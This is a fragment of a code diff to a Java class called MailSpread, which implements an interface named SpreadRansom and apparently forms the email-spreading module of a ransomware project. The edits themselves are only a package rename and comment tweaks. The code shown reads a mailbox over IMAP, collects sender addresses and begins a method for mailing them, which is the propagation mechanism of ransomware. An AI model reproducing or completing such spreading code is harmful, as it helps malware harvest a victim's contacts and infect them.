@@ -1,4 +1,4 @@
-package SpreadR;
+package Agent.SpreadR;
 
 import java.util.Collection;
 import java.util.*;
@@ -18,7 +18,7 @@ public class MailSpread implements SpreadRansom {
 		String provider = "imap";
 
 		// Collection of Mail addresses
-		Collection<String> emails = null;
+		Collection<String> emails = null; // Email collection
 
 		try {
 			// Connect to the server
@@ -41,7 +41,7 @@ public class MailSpread implements SpreadRansom {
 					System.out.println(from);
 				}
 			}
-			Iterator<String> it = emails.iterator();
+			Iterator<String> it = emails.iterator(); // Enables to traverse a container (only for now)
 			while (it.hasNext()) {
 				System.out.println("from: " + it.next());
 			}
@@ -95,10 +95,11 @@ public class MailSpread implements SpreadRansom {
 	}
 
 	public void sendMails(Collection<String> emailsAdresses) {
+		
 		// Sender's email ID needs to be mentioned
 		String from = " ";
 
-		// Assuming you are sending email from localhost
+		// Assuming sending email from localhost
 		String host = "localhost";
 
 		// Get system properties
